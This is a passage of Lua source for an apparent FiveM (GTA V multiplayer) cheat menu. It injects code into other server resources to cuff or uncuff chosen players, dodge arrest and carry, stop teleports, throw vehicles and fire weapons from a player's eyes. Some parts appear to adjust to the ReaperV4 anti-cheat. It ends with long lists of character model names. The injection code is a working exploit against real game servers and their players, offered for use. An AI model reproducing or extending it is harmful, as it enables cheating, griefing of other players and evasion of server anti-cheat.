                                { resource = 'ox_police',      event = 'ox_police:client:uncuff' },
                                { resource = 'lc_jail',        event = 'lc_jail:client:uncuff' },
                                { resource = 'tk_handcuffs',   event = 'tk_handcuffs:client:uncuff' },
                            }

                            for _, v in ipairs(cuffResources) do
                                if MachoResourceInjectable(v.resource) then
                                    injectCode(v.resource, string.format([[
                                        SafeRunNative(TriggerEvent, '%s')
                                    ]], v.event))
                                end
                            end
                        end
                    },
                    {
                        label = 'Cuff Player',
                        type = 'button',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                local player = GetPlayerFromServerId(%d)
                                local targetPed = player > 0 and GetPlayerPed(player)
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(SetEnableHandcuffs, targetPed, true)
                                SafeRunNative(ClearPedTasksImmediately, targetPed)
                                SafeRunNative(SetPedCanRagdoll, targetPed, true)
                            ]], selectedPlayer))
                        end
                    },
                    {
                        label = 'Uncuff Player',
                        type = 'button',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                local player = GetPlayerFromServerId(%d)
                                local targetPed = player > 0 and GetPlayerPed(player)
                                if not targetPed or targetPed <= 0 then return end
                                SafeRunNative(SetEnableHandcuffs, targetPed, false)
                                SafeRunNative(ClearPedTasksImmediately, targetPed)
                                SafeRunNative(SetPedCanRagdoll, targetPed, true)
                            ]], selectedPlayer))
                        end
                    },
                    {
                        label = 'Fast Punch',
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled then
                                injectCode('monitor', [[
                                    fastPunch = true
                                    SafeRunNative(CreateThread, function()
                                        while fastPunch do
                                            local ped = PlayerPedId()
                                            if IsPedOnFoot(ped) and not IsPedInAnyVehicle(ped, false) and GetSelectedPedWeapon(ped) == GetHashKey('WEAPON_UNARMED') then
                                                if SafeRunNative(IsControlPressed, 0, 24) or SafeRunNative(IsControlPressed, 0, 257) then
                                                    SafeRunNative(ClearPedTasksImmediately, ped)
                                                    Wait(500)
                                                end
                                            end
                                            Wait(0)
                                        end
                                    end)
                                ]])
                            else
                                injectCode('monitor', [[
                                    fastPunch = false
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Bubble Mode',
                        type = 'checkbox',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                local setPed = PlayerPedId()
                                SafeRunNative(SetPedConfigFlag, setPed, 423, %s)
                            ]], checked))
                        end
                    },
                    {
                        label = 'Bypass Bubble',
                        type = 'checkbox',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                local setPed = PlayerPedId()
                                SafeRunNative(SetPedConfigFlag, setPed, 140, %s)
                            ]], checked))
                        end
                    },
                    {
                        label = 'Anti Teleport',
                        type = 'checkbox',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                antiTeleportEnabled = %s
                                local lastPos = GetEntityCoords(PlayerPedId())
                                local teleportThreshold = 50.0
                                
                                SafeRunNative(CreateThread, function()
                                    while antiTeleportEnabled do
                                        Wait(100)
                                        local setPed = PlayerPedId()
                                        local currentPos = GetEntityCoords(setPed)
                                        local distance = #(currentPos - lastPos)
                                        
                                        if distance > teleportThreshold then
                                            SafeRunNative(SetEntityCoordsNoOffset, setPed, lastPos.x, lastPos.y, lastPos.z, true, true, true)
                                        else
                                            lastPos = currentPos
                                        end
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        label = 'Anti Cuff',
                        type = 'checkbox',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                antiCuffEnabled = %s
                                local cuffAnims = {
                                    { dict = 'mp_arresting', anim = 'idle' },
                                    { dict = 'rcmpaparazzo_3', anim = 'idle_a' },
                                    { dict = 'anim@move_m@prisoner_cuffed', anim = 'idle' },
                                    { dict = 'missfinale_c2mcs_1', anim = 'fin_c2_mcs_1_camman' },
                                }
                                SafeRunNative(CreateThread, function()
                                    while antiCuffEnabled do
                                        Wait(250)
                                        local ped = PlayerPedId()
                                        local isCuffed = false
                                        for _, v in ipairs(cuffAnims) do
                                            if IsEntityPlayingAnim(ped, v.dict, v.anim, 3) then
                                                isCuffed = true
                                                break
                                            end
                                        end
                                        if not isCuffed then
                                            local speed = GetEntitySpeed(ped)
                                            local maxSpeed = GetEntityMaxSpeed(ped)
                                            if maxSpeed > 0 and maxSpeed < 0.5 and not IsPedInAnyVehicle(ped, false) then
                                                isCuffed = true
                                            end
                                        end
                                        if isCuffed then
                                            SafeRunNative(ClearPedTasksImmediately, ped)
                                            SafeRunNative(SetEntityMaxSpeed, ped, 50.0)
                                            SafeRunNative(SetPedCanRagdoll, ped, true)
                                            SafeRunNative(SetPedDefaultComponentVariation, ped)
                                            local objs = {}
                                            for i = 0, GetNumberOfPedDrawableVariations(ped, 7) do
                                                local obj = GetPedPropIndex(ped, 7)
                                                if obj ~= -1 then
                                                    SafeRunNative(ClearPedProp, ped, 7)
                                                end
                                            end
                                        end
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        label = 'Anti Carry',
                        type = 'checkbox',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                antiCarryEnabled = %s
                                local carryAnims = {
                                    { dict = 'missambulance',        anim = 'amb_carry_patient_a' },
                                    { dict = 'missambulance',        anim = 'amb_carry_patient_b' },
                                    { dict = 'missambulance',        anim = 'amb_carry_patient_c' },
                                    { dict = 'anim@heists@box',      anim = 'idle' },
                                    { dict = 'anim@mp_intro@',       anim = 'idleloop' },
                                    { dict = 'rcmpaparazzo_3',       anim = 'carry_idle' },
                                    { dict = 'missfinale_c2mcs_1',   anim = 'fin_c2_mcs_1_camman' },
                                    { dict = 'anim@move_m@carry_piggyback', anim = 'idle' },
                                    { dict = 'anim@move_m@carry_piggyback', anim = 'loop' },
                                    { dict = 'nm',                   anim = 'firemans_carry' },
                                }
                                SafeRunNative(CreateThread, function()
                                    while antiCarryEnabled do
                                        Wait(200)
                                        local ped = PlayerPedId()
                                        local isCarried = false
                                        for _, v in ipairs(carryAnims) do
                                            if IsEntityPlayingAnim(ped, v.dict, v.anim, 3) then
                                                isCarried = true
                                                break
                                            end
                                        end
                                        if not isCarried then
                                            if GetEntityAttachedTo(ped) ~= 0 then
                                                isCarried = true
                                            end
                                        end
                                        if isCarried then
                                            SafeRunNative(DetachEntity, ped, true, true)
                                            SafeRunNative(ClearPedTasksImmediately, ped)
                                            SafeRunNative(SetEntityMaxSpeed, ped, 50.0)
                                            SafeRunNative(SetPedCanRagdoll, ped, true)
                                            local coords = GetEntityCoords(ped)
                                            SafeRunNative(SetEntityCoordsNoOffset, ped, coords.x, coords.y, coords.z, true, true, true)
                                        end
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        label = 'Throw Nearest Vehicle',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                local vehicle = GetNearestVehicle(true)

                                if vehicle and vehicle > 0 then
                                    EnterVehicleThrowing(vehicle)
                                end
                            ]])
                        end
                    },
                    {
                        label = 'Laser Eyes',
                        type = 'checkbox',
                        checked = false,
                        desc = 'Hold E to fire lasers from your eyes',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                _G.LaserEyesActive = %s
                                _G.LaserEyesLastShot = 0

                                if _G.LaserEyesActive and not _G.LaserEyesThread then
                                    _G.LaserEyesThread = true
                                    SafeRunNative(CreateThread, function()
                                        local function v3ok(v)
                                            return v and v.x == v.x and v.y == v.y and v.z == v.z
                                        end

                                        local function rotToDir(r)
                                            local rx = (math.pi / 180) * r.x
                                            local rz = (math.pi / 180) * r.z
                                            return vector3(
                                                -math.sin(rz) * math.abs(math.cos(rx)),
                                                 math.cos(rz) * math.abs(math.cos(rx)),
                                                 math.sin(rx)
                                            )
                                        end

                                        while _G.LaserEyesActive do
                                            Wait(0)
                                            local ped = PlayerPedId()
                                            if not ped or ped == 0 or not DoesEntityExist(ped) then goto cont end

                                            if not (IsControlPressed(0, 38) or IsDisabledControlPressed(0, 38)) then goto cont end

                                            local camCoord = GetGameplayCamCoord()
                                            local camRot   = GetGameplayCamRot(2)
                                            if not v3ok(camCoord) then goto cont end

                                            local dir = rotToDir(camRot)
                                            local far = vector3(
                                                camCoord.x + dir.x * 5000.0,
                                                camCoord.y + dir.y * 5000.0,
                                                camCoord.z + dir.z * 5000.0
                                            )

                                            local ray = StartExpensiveSynchronousShapeTestLosProbe(
                                                camCoord.x, camCoord.y, camCoord.z,
                                                far.x, far.y, far.z,
                                                -1, ped, 0
                                            )
                                            local _, hit, endCoords = GetShapeTestResult(ray)

                                            local leftEye  = GetPedBoneCoords(ped, 25260, 0.0, 0.0, 0.0)
                                            local rightEye = GetPedBoneCoords(ped, 27474, 0.0, 0.0, 0.0)
                                            local aimPt    = (hit == 1 and v3ok(endCoords)) and endCoords or far

                                            if v3ok(leftEye) and v3ok(rightEye) then
                                                DrawLine(leftEye.x,  leftEye.y,  leftEye.z,  aimPt.x, aimPt.y, aimPt.z, 255, 0, 0, 255)
                                                DrawLine(rightEye.x, rightEye.y, rightEye.z, aimPt.x, aimPt.y, aimPt.z, 255, 0, 0, 255)
                                            end

                                            if v3ok(leftEye) then
                                                local now = GetGameTimer()
                                                if now - (_G.LaserEyesLastShot or 0) >= 75 then
                                                    _G.LaserEyesLastShot = now
                                                    local weapHash = GetHashKey('WEAPON_PISTOL')
                                                    SafeRunNative(Citizen.InvokeNative, 0xBF0FD6E56C964FCB, ped, weapHash, 9999, false, true)
                                                    SafeRunNative(SetCurrentPedWeapon, ped, weapHash, true)
                                                    SafeRunNative(SetPedCurrentWeaponVisible, ped, false, true, true, true)
                                                    SafeRunNative(ShootSingleBulletBetweenCoords,
                                                        leftEye.x, leftEye.y, leftEye.z,
                                                        aimPt.x, aimPt.y, aimPt.z,
                                                        200, true, weapHash, ped, true, false, -1.0
                                                    )
                                                end
                                            end

                                            ::cont::
                                        end
                                        SafeRunNative(RemoveWeaponFromPed, PlayerPedId(), GetHashKey('WEAPON_PISTOL'))
                                        _G.LaserEyesThread = nil
                                    end)
                                end

                                if not _G.LaserEyesActive then
                                    SafeRunNative(RemoveWeaponFromPed, PlayerPedId(), GetHashKey('WEAPON_PISTOL'))
                                end
                            ]], checked and 'true' or 'false'))
                            showNotify('Laser Eyes ' .. (checked and 'On' or 'Off'), checked and 'success' or 'info')
                        end
                    },
                    {
                        label = 'RPG Eyes',
                        type = 'checkbox',
                        checked = false,
                        desc = 'Hold E to fire rockets from your eyes',
                        onConfirm = function(checked)
                            local isReaper = ac == 'ReaperV4' or ac == 'ReaperV4 Pro'
                            injectCode('monitor', string.format([[
                                _G.RpgEyesActive = %s
                                _G.RpgEyesLastShot = 0

                                if _G.RpgEyesActive and not _G.RpgEyesThread then
                                    _G.RpgEyesThread = true
                                    SafeRunNative(CreateThread, function()
                                        local reaper = %s
                                        local function v3ok(v)
                                            return v and v.x == v.x and v.y == v.y and v.z == v.z
                                        end

                                        local function rotToDir(r)
                                            local rx = (math.pi / 180) * r.x
                                            local rz = (math.pi / 180) * r.z
                                            return vector3(
                                                -math.sin(rz) * math.abs(math.cos(rx)),
                                                 math.cos(rz) * math.abs(math.cos(rx)),
                                                 math.sin(rx)
                                            )
                                        end

                                        while _G.RpgEyesActive do
                                            Wait(0)
                                            local ped = SafeRunNative(PlayerPedId)
                                            if not ped or ped == 0 or not SafeRunNative(DoesEntityExist, ped) then goto cont end

                                            if not (SafeRunNative(IsControlPressed, 0, 38) or SafeRunNative(IsDisabledControlPressed, 0, 38)) then goto cont end

                                            local camCoord = SafeRunNative(GetGameplayCamCoord)
                                            local camRot   = SafeRunNative(GetGameplayCamRot, 2)
                                            if not v3ok(camCoord) then goto cont end

                                            local dir = rotToDir(camRot)
                                            local far = vector3(
                                                camCoord.x + dir.x * 5000.0,
                                                camCoord.y + dir.y * 5000.0,
                                                camCoord.z + dir.z * 5000.0
                                            )

                                            local ray = SafeRunNative(StartExpensiveSynchronousShapeTestLosProbe,
                                                camCoord.x, camCoord.y, camCoord.z,
                                                far.x, far.y, far.z,
                                                -1, ped, 0
                                            )
                                            local _, hit, endCoords = SafeRunNative(GetShapeTestResult, ray)

                                            local leftEye  = SafeRunNative(GetPedBoneCoords, ped, 25260, 0.0, 0.0, 0.0)
                                            local rightEye = SafeRunNative(GetPedBoneCoords, ped, 27474, 0.0, 0.0, 0.0)
                                            local aimPt    = (hit == 1 and v3ok(endCoords)) and endCoords or far

                                            if v3ok(leftEye) and v3ok(rightEye) then
                                                SafeRunNative(DrawLine, leftEye.x,  leftEye.y,  leftEye.z,  aimPt.x, aimPt.y, aimPt.z, 255, 150, 0, 255)
                                                SafeRunNative(DrawLine, rightEye.x, rightEye.y, rightEye.z, aimPt.x, aimPt.y, aimPt.z, 255, 150, 0, 255)
                                            end

                                            if v3ok(leftEye) and SafeRunNative(GetGameTimer) - (_G.RpgEyesLastShot or 0) >= 1200 then
                                                _G.RpgEyesLastShot = SafeRunNative(GetGameTimer)
                                                local weapon
                                                if reaper then
                                                    weapon = SafeRunNative(GetHashKey, 'WEAPON_RPG')
                                                else
                                                    weapon = SafeRunNative(GetHashKey, 'VEHICLE_WEAPON_PLAYER_LAZER')
                                                end
                                                SafeRunNative(Citizen.InvokeNative, 0xBF0FD6E56C964FCB, ped, weapon, 1, false, true)
                                                SafeRunNative(SetCurrentPedWeapon, ped, weapon, true)
                                                SafeRunNative(SetPedCurrentWeaponVisible, ped, false, true, true, true)
                                                SafeRunNative(ShootSingleBulletBetweenCoords,
                                                    leftEye.x, leftEye.y, leftEye.z,
                                                    aimPt.x, aimPt.y, aimPt.z,
                                                    200, true, weapon, ped, true, false, -1.0
                                                )
                                            end

                                            ::cont::
                                        end
                                        if reaper then
                                            SafeRunNative(RemoveWeaponFromPed, SafeRunNative(PlayerPedId), SafeRunNative(GetHashKey, 'WEAPON_RPG'))
                                        end
                                        _G.RpgEyesThread = nil
                                    end)
                                end

                                if not _G.RpgEyesActive and reaper then
                                    SafeRunNative(RemoveWeaponFromPed, SafeRunNative(PlayerPedId), SafeRunNative(GetHashKey, 'WEAPON_RPG'))
                                end
                            ]], checked and 'true' or 'false', tostring(isReaper)))
                            showNotify('RPG Eyes ' .. (checked and 'On' or 'Off'), checked and 'success' or 'info')
                        end
                    },
                }
            },
            {
                name = 'Appearance',
                submenu = {
                    {
                        label = 'Randomize Outfit',
                        type = 'button',
                        onConfirm = function()
                            local ped = PlayerPedId()
                            SetPedComponentVariation(ped,3,math.random(1,300),0,0)
                            SetPedComponentVariation(ped,4,math.random(50,500),0,0)
                            SetPedComponentVariation(ped,6,math.random(50,245),0,0)
                            SetPedComponentVariation(ped,11,math.random(50,500),0,0)
                            SetPedComponentVariation(ped,8,15,0,0)
                            SetPedHeadOverlay(ped,2,8,1.0) SetPedHeadOverlayColor(ped,2,1,1,1)
                            SetPedHeadOverlay(ped,1,5,1.0) SetPedHeadOverlayColor(ped,1,1,1,1)
                            SetPedHeadBlendData(ped,math.random(0,45),math.random(0,45),0,math.random(0,45),math.random(0,45),0,0.5,0.5,0.0,false)
                            SetPedComponentVariation(ped,2,math.random(0,75),0,0)
                            SetPedHairColor(ped,0,0)
                        end
                    },
                    {
                        label = 'Save Outfit',
                        type = 'button',
                        onConfirm = function()
                            injectCode('illenium-appearance', [[
                                SafeRunNative(TriggerEvent, 'illenium-appearance:client:saveOutfit') 
                            ]])
                        end
                    },
                    {
                        label = 'Outfit Menu',
                        type = 'button',
                        onConfirm = function()
                            injectCode('illenium-appearance', [[
                                SafeRunNative(TriggerEvent, 'illenium-appearance:client:openClothingShop', true) 
                            ]])
                        end
                    },
                    {
                        label = 'Reload Skin',
                        type = 'button',
                        onConfirm = function()
                            injectCode('illenium-appearance', [[
                                SafeRunNative(TriggerEvent, 'illenium-appearance:client:reloadSkin') 
                            ]])
                        end
                    },
                    { type = 'divider', label = 'Models' },
                    {
                        type = "scroll",
                        label = "Male Peds",
                        options = {
                            { label = "mp_m_freemode_01", value = "mp_m_freemode_01" },
                            { label = "a_m_m_afriamer_01", value = "a_m_m_afriamer_01" },
                            { label = "a_m_m_beach_01", value = "a_m_m_beach_01" },
                            { label = "a_m_m_beach_02", value = "a_m_m_beach_02" },
                            { label = "a_m_m_bevhills_01", value = "a_m_m_bevhills_01" },
                            { label = "a_m_m_bevhills_02", value = "a_m_m_bevhills_02" },
                            { label = "a_m_m_business_01", value = "a_m_m_business_01" },
                            { label = "a_m_m_eastsa_01", value = "a_m_m_eastsa_01" },
                            { label = "a_m_m_eastsa_02", value = "a_m_m_eastsa_02" },
                            { label = "a_m_m_farmer_01", value = "a_m_m_farmer_01" },
                            { label = "a_m_m_fatlatin_01", value = "a_m_m_fatlatin_01" },
                            { label = "a_m_m_genfat_01", value = "a_m_m_genfat_01" },
                            { label = "a_m_m_genfat_02", value = "a_m_m_genfat_02" },
                            { label = "a_m_m_golfer_01", value = "a_m_m_golfer_01" },
                            { label = "a_m_m_hasjew_01", value = "a_m_m_hasjew_01" },
                            { label = "a_m_m_hillbilly_01", value = "a_m_m_hillbilly_01" },
                            { label = "a_m_m_hillbilly_02", value = "a_m_m_hillbilly_02" },
                            { label = "a_m_m_indian_01", value = "a_m_m_indian_01" },
                            { label = "a_m_m_ktown_01", value = "a_m_m_ktown_01" },
                            { label = "a_m_m_malibu_01", value = "a_m_m_malibu_01" },
                            { label = "a_m_m_mexcntry_01", value = "a_m_m_mexcntry_01" },
                            { label = "a_m_m_mexlabor_01", value = "a_m_m_mexlabor_01" },
                            { label = "a_m_m_og_boss_01", value = "a_m_m_og_boss_01" },
                            { label = "a_m_m_paparazzi_01", value = "a_m_m_paparazzi_01" },
                            { label = "a_m_m_polynesian_01", value = "a_m_m_polynesian_01" },
                            { label = "a_m_m_prolhost_01", value = "a_m_m_prolhost_01" },
                            { label = "a_m_m_rurmeth_01", value = "a_m_m_rurmeth_01" },
                            { label = "a_m_m_salton_01", value = "a_m_m_salton_01" },
                            { label = "a_m_m_salton_02", value = "a_m_m_salton_02" },
                            { label = "a_m_m_salton_03", value = "a_m_m_salton_03" },
                            { label = "a_m_m_salton_04", value = "a_m_m_salton_04" },
                            { label = "a_m_m_skater_01", value = "a_m_m_skater_01" },
                            { label = "a_m_m_skidrow_01", value = "a_m_m_skidrow_01" },
                            { label = "a_m_m_socenlat_01", value = "a_m_m_socenlat_01" },
                            { label = "a_m_m_soucent_01", value = "a_m_m_soucent_01" },
                            { label = "a_m_m_soucent_02", value = "a_m_m_soucent_02" },
                            { label = "a_m_m_soucent_03", value = "a_m_m_soucent_03" },
                            { label = "a_m_m_soucent_04", value = "a_m_m_soucent_04" },
                            { label = "a_m_m_stlat_02", value = "a_m_m_stlat_02" },
                            { label = "a_m_m_tourist_01", value = "a_m_m_tourist_01" },
                            { label = "a_m_m_tramp_01", value = "a_m_m_tramp_01" },
                            { label = "a_m_m_trampbeac_01", value = "a_m_m_trampbeac_01" },
                            { label = "a_m_m_tranvest_01", value = "a_m_m_tranvest_01" },
                            { label = "a_m_m_tranvest_02", value = "a_m_m_tranvest_02" },
                            { label = "a_m_o_beach_01", value = "a_m_o_beach_01" },
                            { label = "a_m_o_genstreet_01", value = "a_m_o_genstreet_01" },
                            { label = "a_m_o_ktown_01", value = "a_m_o_ktown_01" },
                            { label = "a_m_o_salton_01", value = "a_m_o_salton_01" },
                            { label = "a_m_o_soucent_01", value = "a_m_o_soucent_01" },
                            { label = "a_m_o_soucent_02", value = "a_m_o_soucent_02" },
                            { label = "a_m_o_soucent_03", value = "a_m_o_soucent_03" },
                            { label = "a_m_o_tramp_01", value = "a_m_o_tramp_01" },
                            { label = "a_m_y_beach_01", value = "a_m_y_beach_01" },
                            { label = "a_m_y_beach_02", value = "a_m_y_beach_02" },
                            { label = "a_m_y_beach_03", value = "a_m_y_beach_03" },
                            { label = "a_m_y_bevhills_01", value = "a_m_y_bevhills_01" },
                            { label = "a_m_y_bevhills_02", value = "a_m_y_bevhills_02" },
                            { label = "a_m_y_breakdance_01", value = "a_m_y_breakdance_01" },
                            { label = "a_m_y_busicas_01", value = "a_m_y_busicas_01" },
                            { label = "a_m_y_business_01", value = "a_m_y_business_01" },
                            { label = "a_m_y_business_02", value = "a_m_y_business_02" },
                            { label = "a_m_y_business_03", value = "a_m_y_business_03" },
                            { label = "a_m_y_cyclist_01", value = "a_m_y_cyclist_01" },
                            { label = "a_m_y_dhill_01", value = "a_m_y_dhill_01" },
                            { label = "a_m_y_downtown_01", value = "a_m_y_downtown_01" },
                            { label = "a_m_y_eastsa_01", value = "a_m_y_eastsa_01" },
                            { label = "a_m_y_eastsa_02", value = "a_m_y_eastsa_02" },
                            { label = "a_m_y_epsilon_01", value = "a_m_y_epsilon_01" },
                            { label = "a_m_y_epsilon_02", value = "a_m_y_epsilon_02" },
                            { label = "a_m_y_gay_01", value = "a_m_y_gay_01" },
                            { label = "a_m_y_gay_02", value = "a_m_y_gay_02" },
                            { label = "a_m_y_genstreet_01", value = "a_m_y_genstreet_01" },
                            { label = "a_m_y_genstreet_02", value = "a_m_y_genstreet_02" },
                            { label = "a_m_y_golfer_01", value = "a_m_y_golfer_01" },
                            { label = "a_m_y_hasjew_01", value = "a_m_y_hasjew_01" },
                            { label = "a_m_y_hiker_01", value = "a_m_y_hiker_01" },
                            { label = "a_m_y_hippy_01", value = "a_m_y_hippy_01" },
                            { label = "a_m_y_hipster_01", value = "a_m_y_hipster_01" },
                            { label = "a_m_y_hipster_02", value = "a_m_y_hipster_02" },
                            { label = "a_m_y_hipster_03", value = "a_m_y_hipster_03" },
                            { label = "a_m_y_hipster_04", value = "a_m_y_hipster_04" },
                            { label = "a_m_y_indian_01", value = "a_m_y_indian_01" },
                            { label = "a_m_y_juggalo_01", value = "a_m_y_juggalo_01" },
                            { label = "a_m_y_ktown_01", value = "a_m_y_ktown_01" },
                            { label = "a_m_y_ktown_02", value = "a_m_y_ktown_02" },
                            { label = "a_m_y_latino_01", value = "a_m_y_latino_01" },
                            { label = "a_m_y_methhead_01", value = "a_m_y_methhead_01" },
                            { label = "a_m_y_mexthug_01", value = "a_m_y_mexthug_01" },
                            { label = "a_m_y_motox_01", value = "a_m_y_motox_01" },
                            { label = "a_m_y_motox_02", value = "a_m_y_motox_02" },
                            { label = "a_m_y_musclbeac_01", value = "a_m_y_musclbeac_01" },
                            { label = "a_m_y_musclbeac_02", value = "a_m_y_musclbeac_02" },
                            { label = "a_m_y_polynesian_01", value = "a_m_y_polynesian_01" },
                            { label = "a_m_y_roadcyc_01", value = "a_m_y_roadcyc_01" },
                            { label = "a_m_y_runner_01", value = "a_m_y_runner_01" },
                            { label = "a_m_y_runner_02", value = "a_m_y_runner_02" },
                            { label = "a_m_y_salton_01", value = "a_m_y_salton_01" },
                            { label = "a_m_y_skater_01", value = "a_m_y_skater_01" },
                            { label = "a_m_y_skater_02", value = "a_m_y_skater_02" },
                            { label = "a_m_y_smartcaspat_01", value = "a_m_y_smartcaspat_01" },
                            { label = "a_m_y_soucent_01", value = "a_m_y_soucent_01" },
                            { label = "a_m_y_soucent_02", value = "a_m_y_soucent_02" },
                            { label = "a_m_y_soucent_03", value = "a_m_y_soucent_03" },
                            { label = "a_m_y_soucent_04", value = "a_m_y_soucent_04" },
                            { label = "a_m_y_stbla_01", value = "a_m_y_stbla_01" },
                            { label = "a_m_y_stbla_02", value = "a_m_y_stbla_02" },
                            { label = "a_m_y_stlat_01", value = "a_m_y_stlat_01" },
                            { label = "a_m_y_stwhi_01", value = "a_m_y_stwhi_01" },
                            { label = "a_m_y_stwhi_02", value = "a_m_y_stwhi_02" },
                            { label = "a_m_y_sunbathe_01", value = "a_m_y_sunbathe_01" },
                            { label = "a_m_y_surfer_01", value = "a_m_y_surfer_01" },
                            { label = "a_m_y_vindouche_01", value = "a_m_y_vindouche_01" },
                            { label = "a_m_y_vinewood_01", value = "a_m_y_vinewood_01" },
                            { label = "a_m_y_vinewood_02", value = "a_m_y_vinewood_02" },
                            { label = "a_m_y_vinewood_03", value = "a_m_y_vinewood_03" },
                            { label = "a_m_y_vinewood_04", value = "a_m_y_vinewood_04" },
                            { label = "a_m_y_yoga_01", value = "a_m_y_yoga_01" }
                        },
                        selected = 1,
                        onConfirm = function(data)
                            local modelName = data.value
                            injectCode('monitor', string.format([[
                                local model = GetHashKey('%s')
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(0) end
                                SafeRunNative(SetPlayerModel, PlayerId(), model)
                                SetModelAsNoLongerNeeded(model)

                                if model == 1885233650 then
                                    SetPedDefaultComponentVariation(PlayerPedId(), true)
                                end
                            ]], modelName))
                        end
                    },
                    {
                        type = "scroll",
                        label = "Female Peds",
                        options = {
                            { label = "mp_f_freemode_01", value = "mp_f_freemode_01" },
                            { label = "a_f_m_beach_01", value = "a_f_m_beach_01" },
                            { label = "a_f_m_bevhills_01", value = "a_f_m_bevhills_01" },
                            { label = "a_f_m_bevhills_02", value = "a_f_m_bevhills_02" },
                            { label = "a_f_m_bodybuild_01", value = "a_f_m_bodybuild_01" },
                            { label = "a_f_m_business_02", value = "a_f_m_business_02" },
                            { label = "a_f_m_downtown_01", value = "a_f_m_downtown_01" },
                            { label = "a_f_m_eastsa_01", value = "a_f_m_eastsa_01" },
                            { label = "a_f_m_eastsa_02", value = "a_f_m_eastsa_02" },
                            { label = "a_f_m_fatbla_01", value = "a_f_m_fatbla_01" },
                            { label = "a_f_m_fatcult_01", value = "a_f_m_fatcult_01" },
                            { label = "a_f_m_fatwhite_01", value = "a_f_m_fatwhite_01" },
                            { label = "a_f_m_ktown_01", value = "a_f_m_ktown_01" },
                            { label = "a_f_m_ktown_02", value = "a_f_m_ktown_02" },
                            { label = "a_f_m_prolhost_01", value = "a_f_m_prolhost_01" },
                            { label = "a_f_m_salton_01", value = "a_f_m_salton_01" },
                            { label = "a_f_m_skidrow_01", value = "a_f_m_skidrow_01" },
                            { label = "a_f_m_soucent_01", value = "a_f_m_soucent_01" },
                            { label = "a_f_m_soucent_02", value = "a_f_m_soucent_02" },
                            { label = "a_f_m_soucentmc_01", value = "a_f_m_soucentmc_01" },
                            { label = "a_f_m_tourist_01", value = "a_f_m_tourist_01" },
                            { label = "a_f_m_tramp_01", value = "a_f_m_tramp_01" },
                            { label = "a_f_m_trampbeac_01", value = "a_f_m_trampbeac_01" },
                            { label = "a_f_o_genstreet_01", value = "a_f_o_genstreet_01" },
                            { label = "a_f_o_indian_01", value = "a_f_o_indian_01" },
                            { label = "a_f_o_ktown_01", value = "a_f_o_ktown_01" },
                            { label = "a_f_o_soucent_01", value = "a_f_o_soucent_01" },
                            { label = "a_f_o_soucent_02", value = "a_f_o_soucent_02" },
                            { label = "a_f_y_beach_01", value = "a_f_y_beach_01" },
                            { label = "a_f_y_bevhills_01", value = "a_f_y_bevhills_01" },
                            { label = "a_f_y_bevhills_02", value = "a_f_y_bevhills_02" },
                            { label = "a_f_y_bevhills_03", value = "a_f_y_bevhills_03" },
                            { label = "a_f_y_bevhills_04", value = "a_f_y_bevhills_04" },
                            { label = "a_f_y_business_01", value = "a_f_y_business_01" },
                            { label = "a_f_y_business_02", value = "a_f_y_business_02" },
                            { label = "a_f_y_business_03", value = "a_f_y_business_03" },
                            { label = "a_f_y_business_04", value = "a_f_y_business_04" },
                            { label = "a_f_y_eastsa_01", value = "a_f_y_eastsa_01" },
                            { label = "a_f_y_eastsa_02", value = "a_f_y_eastsa_02" },
                            { label = "a_f_y_eastsa_03", value = "a_f_y_eastsa_03" },
                            { label = "a_f_y_epsilon_01", value = "a_f_y_epsilon_01" },
                            { label = "a_f_y_femaleagent", value = "a_f_y_femaleagent" },
                            { label = "a_f_y_fitness_01", value = "a_f_y_fitness_01" },
                            { label = "a_f_y_fitness_02", value = "a_f_y_fitness_02" },
                            { label = "a_f_y_genhot_01", value = "a_f_y_genhot_01" },
                            { label = "a_f_y_golfer_01", value = "a_f_y_golfer_01" },
                            { label = "a_f_y_hiker_01", value = "a_f_y_hiker_01" },
                            { label = "a_f_y_hippie_01", value = "a_f_y_hippie_01" },
                            { label = "a_f_y_hipster_01", value = "a_f_y_hipster_01" },
                            { label = "a_f_y_hipster_02", value = "a_f_y_hipster_02" },
                            { label = "a_f_y_hipster_03", value = "a_f_y_hipster_03" },
                            { label = "a_f_y_hipster_04", value = "a_f_y_hipster_04" },
                            { label = "a_f_y_indian_01", value = "a_f_y_indian_01" },
                            { label = "a_f_y_juggalo_01", value = "a_f_y_juggalo_01" },
                            { label = "a_f_y_runner_01", value = "a_f_y_runner_01" },
                            { label = "a_f_y_rurmeth_01", value = "a_f_y_rurmeth_01" },
                            { label = "a_f_y_scdressy_01", value = "a_f_y_scdressy_01" },
                            { label = "a_f_y_skater_01", value = "a_f_y_skater_01" },
                            { label = "a_f_y_soucent_01", value = "a_f_y_soucent_01" },
                            { label = "a_f_y_soucent_02", value = "a_f_y_soucent_02" },
                            { label = "a_f_y_soucent_03", value = "a_f_y_soucent_03" },
                            { label = "a_f_y_tennis_01", value = "a_f_y_tennis_01" },
                            { label = "a_f_y_topless_01", value = "a_f_y_topless_01" },
                            { label = "a_f_y_tourist_01", value = "a_f_y_tourist_01" },
                            { label = "a_f_y_tourist_02", value = "a_f_y_tourist_02" },
                            { label = "a_f_y_vinewood_01", value = "a_f_y_vinewood_01" },
                            { label = "a_f_y_vinewood_02", value = "a_f_y_vinewood_02" },
                            { label = "a_f_y_vinewood_03", value = "a_f_y_vinewood_03" },
                            { label = "a_f_y_vinewood_04", value = "a_f_y_vinewood_04" },
                            { label = "a_f_y_yoga_01", value = "a_f_y_yoga_01" }
